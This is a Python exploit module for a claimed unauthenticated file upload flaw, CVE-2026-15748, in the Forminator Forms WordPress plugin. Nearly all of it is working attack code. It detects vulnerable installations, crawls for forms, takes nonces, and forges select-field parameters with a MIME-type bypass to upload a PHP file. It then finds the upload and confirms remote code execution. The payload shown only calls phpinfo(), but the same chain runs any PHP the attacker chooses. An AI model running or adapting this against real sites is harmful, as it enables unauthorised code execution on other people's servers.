# -*- coding: utf-8 -*-
# CVE-2026-15748 — Forminator Forms <= 1.56.1 unauth arbitrary file upload
# Chain: return-key injection + additional-type MIME bypass
# Function-only refactor. No import side-effects. Thread-safe (session per-call).
# Coded by 0x4cr — refactored
import io
import re
import time
import requests
from urllib.parse import urljoin

CVE_ID = 'CVE-2026-15748'
CVE_NAME = 'Forminator Forms <= 1.56.1 unauth arbitrary file upload'
DEFAULT_KWARGS = {}

SAFE_PAYLOAD = '<?php echo "CVE-2026-15748-PoC-Verified"; phpinfo(); ?>'
UPLOAD_FILENAME = 'poc-test-cve-2026-15748.php'
MARKER = 'CVE-2026-15748-PoC-Verified'
DEFAULT_TIMEOUT = 10


# ────────────── helpers ──────────────
def _check_target(session, base_url, timeout):
    try:
        r = session.get(base_url, timeout=timeout)
        r.raise_for_status()
    except requests.RequestException:
        return False
    if 'wp-content' not in r.text and 'wordpress' not in r.text.lower():
        return False
    return True


def _detect_forminator(session, base_url, timeout):
    indicators = [
        '/wp-content/plugins/forminator/',
        'forminator-custom-form',
        'forminator_submit_form',
    ]
    try:
        resp = session.get(base_url, timeout=timeout)
    except requests.RequestException:
        return False

    for ind in indicators:
        if ind in resp.text:
            return True

    readme_url = urljoin(base_url, '/wp-content/plugins/forminator/readme.txt')
    try:
        r = session.get(readme_url, timeout=timeout)
        if r.status_code == 200 and 'forminator' in r.text.lower():
            m = re.search(r'Stable tag:\s*([\d.]+)', r.text, re.IGNORECASE)
            if m:
                ver = m.group(1)
                if ver > '1.56.1':
                    return False
            return True
    except requests.RequestException:
        pass
    return False


def _find_forms(session, base_url, timeout):
    candidates = set()
    try:
        resp = session.get(base_url, timeout=timeout)
    except requests.RequestException:
        return candidates

    links = re.findall(r'href=["\']([^"\']*)["\']', resp.text)
    internal = set()
    for link in links:
        full = urljoin(base_url, link)
        if full.startswith(base_url) and '#' not in full:
            internal.add(full)
    internal.add(base_url)

    for url in list(internal)[:30]:
        try:
            r = session.get(url, timeout=timeout)
        except requests.RequestException:
            continue
        if 'forminator-custom-form' not in r.text:
            continue
        has_upload = bool(
            re.search(r'type=["\']file["\']', r.text)
            or 'forminator-upload' in r.text
            or 'upload-field' in r.text
        )
        has_select = bool(
            re.search(r'class="[^"]*forminator-select', r.text)
            or 'select-field' in r.text
        )
        if has_upload and has_select:
            candidates.add(url)
    return candidates


def _extract_form_data(session, page_url, base_url, timeout):
    try:
        resp = session.get(page_url, timeout=timeout)
    except requests.RequestException:
        return None
    html = resp.text

    form_id_m = (re.search(r'name=["\']form_id["\']\s+value=["\'](\d+)["\']', html)
                 or re.search(r'data-form-id=["\'](\d+)["\']', html)
                 or re.search(r'"forminator_form_id"\s*:\s*"?(\d+)"?', html))
    if not form_id_m:
        return None
    form_id = form_id_m.group(1)

    nonce_m = (re.search(r'id=["\']forminator_nonce["\']\s+name=["\']forminator_nonce["\']\s+value=["\']([^"\']+)["\']', html)
               or re.search(r'name=["\']forminator_nonce["\']\s+value=["\']([^"\']+)["\']', html)
               or re.search(r'name=["\']_forminator_nonce["\']\s+value=["\']([^"\']+)["\']', html))
    nonce = nonce_m.group(1) if nonce_m else None

    if not nonce:
        try:
            r = session.post(urljoin(base_url, '/wp-admin/admin-ajax.php'),
                             data={'action': 'forminator_get_nonce', 'form_id': form_id},
                             timeout=timeout)
            if r.status_code == 200:
                data = r.json()
                if data.get('success') and data.get('data'):
                    nonce = data['data']
        except (requests.RequestException, ValueError):
            pass
    if not nonce:
        return None

    page_id_m = re.search(r'name=["\']page_id["\']\s+value=["\']([^"\']+)["\']', html)
    page_id = page_id_m.group(1) if page_id_m else ''

    upload_field = re.search(r'name=["\']([^"\']*upload[^"\']*)["\']', html, re.IGNORECASE)
    select_field = re.search(r'<select[^>]+name=["\']([^"\']*select[^"\']*)["\']', html, re.IGNORECASE)

    return {
        'form_id': form_id,
        'nonce': nonce,
        'page_id': page_id,
        'upload_field': upload_field.group(1) if upload_field else 'upload-1',
        'select_field': select_field.group(1) if select_field else 'select-1',
        '_page_url': page_url,
    }


# ────────────── exploit core ──────────────
def _do_upload(session, base_url, form_data, timeout):
    ajax_url = urljoin(base_url, '/wp-admin/admin-ajax.php')
    select_name = form_data['select_field']
    upload_name = form_data['upload_field']
    boundary = '----FormBoundaryCVE202615748PoC'

    def build_body(forged, php_field):
        body = io.BytesIO()

        def add_field(name, value):
            body.write(f'--{boundary}\r\n'.encode())
            body.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
            body.write(f'{value}\r\n'.encode())

        def add_file(name, filename, content, ctype):
            body.write(f'--{boundary}\r\n'.encode())
            body.write(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode())
            body.write(f'Content-Type: {ctype}\r\n\r\n'.encode())
            body.write(content)
            body.write(b'\r\n')

        add_field('action', 'forminator_submit_form_custom-forms')
        add_field('form_id', form_data['form_id'])
        add_field('forminator_nonce', form_data['nonce'])
        add_field('page_id', form_data.get('page_id', ''))
        add_field('form_type', 'default')
        add_field('current_url', f"{base_url}/?page_id={form_data.get('page_id', '')}")
        add_field('render_id', '0')
        for k, v in forged:
            add_field(k, v)
        add_file(upload_name, 'placeholder.jpg',
                 b'\xff\xd8\xff\xe0\x00\x10JFIF', 'image/jpeg')
        add_file(php_field, UPLOAD_FILENAME, SAFE_PAYLOAD.encode(),
                 'application/octet-stream')
        body.write(f'--{boundary}--\r\n'.encode())
        return body.getvalue()

    base_forged = [
        (f'{select_name}[return]', '1'),
        (f'{select_name}[name]', select_name),
        (f'{select_name}[field_type]', 'upload'),
        (f'{select_name}[field_array][element_id]', select_name),
        (f'{select_name}[field_array][type]', 'upload'),
        (f'{select_name}[field_array][custom-files]', '1'),
        (f'{select_name}[field_array][filetypes][]', 'ph(p)'),
        (f'{select_name}[field_array][file-type]', 'single'),
        (f'{select_name}[field_array][upload-limit]', '10'),
        (f'{select_name}[field_array][filesize]', 'MB'),
    ]

    vectors = [
        ('text/x-php', base_forged + [(f'{select_name}[field_array][additional-type]', 'ph(p)|text/x-php')]),
        ('text/plain', base_forged + [(f'{select_name}[field_array][additional-type]', 'ph(p)|text/plain')]),
        ('application/x-httpd-php', base_forged + [(f'{select_name}[field_array][additional-type]', 'ph(p)|application/x-httpd-php')]),
    ]

    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}

    for mime_name, forged in vectors:
        payload = build_body(forged, select_name)
        try:
            resp = session.post(ajax_url, data=payload, headers=headers, timeout=timeout)
        except requests.RequestException:
            continue

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('success'):
                    return resp
            except ValueError:
                return resp
        elif resp.status_code == 500:
            return resp

    return None


# ────────────── verification ──────────────
def _discover_upload_dir(session, base_url, form_id, page_url, timeout):
    sources = []
    if page_url:
        sources.append(page_url)
    sources.append(base_url)
    for src in sources:
        try:
            r = session.get(src, timeout=timeout)
        except requests.RequestException:
            continue
        hits = re.findall(r'/wp-content/uploads/forminator/(\d+_[a-f0-9]+)/', r.text)
        for hit in hits:
            if not form_id or hit.startswith(f'{form_id}_'):
                return f'/wp-content/uploads/forminator/{hit}/uploads/'
    if form_id:
        return f'/wp-content/uploads/forminator/{form_id}/uploads/'
    return None


def _check_uploaded_file(session, file_url, timeout):
    try:
        r = session.get(file_url, timeout=timeout)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    if MARKER in r.text:
        return file_url
    if SAFE_PAYLOAD in r.text:
        return file_url
    return None


def _verify_upload(session, base_url, form_data, timeout):
    form_id = form_data.get('form_id', '') if isinstance(form_data, dict) else ''
    page_url = form_data.get('_page_url', '') if isinstance(form_data, dict) else ''

    upload_base = _discover_upload_dir(session, base_url, form_id, page_url, timeout)
    if upload_base:
        dir_url = urljoin(base_url, upload_base)
        try:
            r = session.get(dir_url, timeout=timeout)
            if r.status_code == 200:
                matches = re.findall(
                    rf'href=["\']([^"\']*{re.escape(UPLOAD_FILENAME)})["\']', r.text)
                for match in matches:
                    url = urljoin(dir_url, match)
                    hit = _check_uploaded_file(session, url, timeout)
                    if hit:
                        return hit
        except requests.RequestException:
            pass

    marker = UPLOAD_FILENAME.replace('.php', '')
    try:
        api = urljoin(base_url, '/wp-json/wp/v2/media?per_page=5&orderby=date&order=desc')
        r = session.get(api, timeout=timeout)
        if r.status_code == 200:
            for item in r.json():
                src = item.get('source_url', '') or item.get('guid', {}).get('rendered', '')
                if marker in src:
                    hit = _check_uploaded_file(session, src, timeout)
                    if hit:
                        return hit
    except (requests.RequestException, ValueError):
        pass
    return None


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, page_url=None, form_id=None,
            debug=False, timeout=DEFAULT_TIMEOUT):
    """
    Exploit CVE-2026-15748 (Forminator <= 1.56.1 unauth file upload).

    Args:
        target_url : str  — 'http://x.com', 'x.com'
        page_url   : str  — direct URL halaman berisi form (skip crawl)
        form_id    : str  — manual form ID override
        debug      : bool — collect log
        timeout    : int  — per-request timeout

    Returns:
        dict — standard contract. 'exploited' = True hanya jika shell/upload
        verified accessible via HTTP.
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'not detected',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': MARKER,
        'detail': '',
        'exploited': False,
        'log': [],
        'evidence': None,
    }
    log = res['log']

    def _step(msg):
        if debug:
            log.append(msg)

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res
    base = target_url.strip().rstrip('/')
    if not base.startswith(('http://', 'https://')):
        base = 'http://' + base
    res['target'] = base

    session = requests.Session()
    session.headers.update({'User-Agent': 'CVE-2026-15748-PoC/1.0'})

    try:
        if not _check_target(session, base, timeout):
            res['detail'] = 'not WordPress / unreachable'
            return res
        _step('wordpress reachable')

        if not _detect_forminator(session, base, timeout):
            res['detail'] = 'forminator not detected or version patched'
            return res
        res['plugin'] = 'detected'
        _step('forminator detected')

        pages = {page_url} if page_url else _find_forms(session, base, timeout)
        if not pages:
            res['detail'] = 'no vulnerable form found (need file+select field)'
            return res
        target_page = list(pages)[0]
        _step(f'form page: {target_page}')

        form_data = _extract_form_data(session, target_page, base, timeout)
        if not form_data:
            res['detail'] = 'could not extract form metadata'
            return res
        if form_id:
            form_data['form_id'] = form_id
        _step(f"form_id={form_data['form_id']} nonce={form_data['nonce'][:8]}...")

        resp = _do_upload(session, base, form_data, timeout)
        if resp is None:
            res['detail'] = 'all upload vectors rejected'
            return res
        res['vulnerable'] = True
        res['http_status'] = resp.status_code
        _step('upload request accepted')

        time.sleep(1)
        shell_url = _verify_upload(session, base, form_data, timeout)
        if not shell_url:
            res['detail'] = 'upload sent but file not located (prefix randomized)'
            return res

        res['shell_url'] = shell_url
        res['endpoint'] = shell_url
        res['exploited'] = True
        res['rce_verified'] = 'YES'
        res['evidence'] = {
            'type': 'upload',
            'shell_url': shell_url,
            'form_id': form_data['form_id'],
            'page_url': target_page,
        }

        # sample output: request the uploaded file
        try:
            r = session.get(shell_url, timeout=timeout)
            if MARKER in r.text:
                res['output'] = f'payload executes at {shell_url}'
                res['detail'] = 'RCE confirmed (payload marker seen)'
            else:
                res['detail'] = 'uploaded but not executing (PHP disabled/.htaccess)'
        except requests.RequestException:
            res['detail'] = 'upload verified via redirect but GET failed'

        return res
    except Exception as e:
        res['detail'] = f'unhandled: {type(e).__name__}: {e}'
        return res
    finally:
        session.close()